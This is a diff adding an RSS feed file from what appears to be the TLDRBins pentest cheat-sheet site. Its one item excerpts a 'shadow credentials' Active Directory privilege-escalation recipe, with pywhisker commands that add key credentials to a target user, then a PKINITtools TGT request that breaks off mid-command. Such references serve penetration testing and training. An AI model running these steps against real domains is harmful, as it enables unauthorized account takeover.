@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>AddKeyCredentialLink on TLDRBins</title>
+    <link>https://tldrbins.github.io/@addkeycredentiallink/</link>
+    <description>Recent content in AddKeyCredentialLink on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@addkeycredentiallink/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AddKeyCredentialLink</title>
+      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
+      <description>Privesc #1: Shadow credentials (From Linux) pywhisker&#xA;0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools&#xA;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.</description>
+    </item>
+  </channel>
+</rss>
